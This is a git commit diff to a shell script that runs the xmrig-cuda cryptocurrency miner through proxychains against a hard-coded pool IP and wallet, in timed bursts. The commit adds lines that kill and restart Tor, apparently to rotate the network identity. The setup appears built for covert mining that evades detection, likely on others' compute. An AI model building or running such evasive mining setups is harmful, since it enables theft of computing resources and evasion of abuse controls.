9874de1f2d1aa9583c838da0a9d7ce2d536a7090
kartikbhalala <47134161+kartikbhalala@users.noreply.github.com>
2021-01-13 18:48:54 +0530

    Update lol3.sh

--- lol3.sh
+++ lol3.sh
@@ -13,6 +13,8 @@ do
 	e=120
 	aaram=$(($w+$e))
 	timeout -k 5 $c\s  proxychains ./xmrig-cuda/build/xmrig --donate-level 0 -o 54.189.231.81:13802 -O  RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc:pps  -a kawpow --cuda --tls  --no-cpu  --retries=5000
+	timeout -k 5 6s pgrep tor | xargs kill
+	screen -dmS TOR tor
 	sleep $aaram
 	echo "Kartik Bhai Amar Rahe"
 done
